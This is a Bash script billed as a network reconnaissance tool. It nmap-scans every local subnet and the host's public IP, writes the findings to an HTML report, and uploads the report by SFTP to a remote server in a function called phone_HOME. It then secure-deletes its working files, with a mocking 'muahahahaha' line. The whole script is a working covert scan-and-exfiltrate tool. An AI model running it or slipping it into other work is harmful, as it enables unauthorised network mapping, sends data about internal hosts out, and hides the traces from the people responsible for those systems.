#!/bin/bash
#####################################################
# Bash Network Reconnaissance Script * Version 2.0  #
# 	DarkerEgo's Bash Snippets, GPL 2015 	    #
#####################################################

# Edit SFTP Variables: 
sftpUSER="user"
sftpHOST="remoteserver"
sftpDIR="some/directory"
#
#######################
workDIR="/tmp/netrecon"
OUTPUT="netenv.$(hostname).$(date +'%d-%m-%y').html"
TITLE="Bash Network Reconnaissance Results"
RIGHT_NOW=$(date +"%x %r %Z")
pubIP=$(curl ipreturn.tk)
########################
INTFACES=$(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
intIPS=$(for i in ${INTFACES}; do /sbin/ifconfig $i | grep Mask | cut -d ':' -f2 | cut -d " " -f1; done)
intSNS=$(for i in ${intIPS}; do echo $i | cut -d "." -f -3 | sed 's/$/.*/'; done)
sn_RESULTS=$(for i in ${intSNS}; do nmap -sV -F $i; done)
pi_RESULTS=(nmap -sV -F ${pubIP})
########################

function prep_VARS(){

if [[ ! -d $workDIR ]];then
	mkdir $workDIR
fi

if [[ -f $workDIR/$OUTPUT ]];then
	srm $workDIR/$OUTPUT || rm $workDIR/$OUTPUT
fi

	touch $workDIR/$OUTPUT
}


function write_page(){


cat << _EOF_

<html>
  <head>
      <title>$TITLE</title>
  </head>

  <body bgcolor="black" text="white">
      <h1>$TITLE</h1>
      <p>$RIGHT_NOW</p>
	<p><b> Local Subnet Scan Results: </b></p>
	<pre>
		${sn_RESULTS}
		${pi_RESULTS}
	</pre>
  </body>
</html>
_EOF_

}

function phone_HOME(){

cd $workDIR

if [[ ! -f $workDIR/batch ]];then

cat << 'EOF' >> $workDIR/batch
        put netenv*.html
EOF

fi

cd $workDIR
sftp -b batch $sftpUSER@$sftpHOST:/$sftpDIR


}

function clean_UP(){
# if secure-delete is not available, revert to rm
srm -r $workDIR || rm -rf $workDIR
echo "muahahahaha" >> /dev/null
}


prep_VARS
write_page > $OUTPUT
phone_HOME
clean_UP
exit
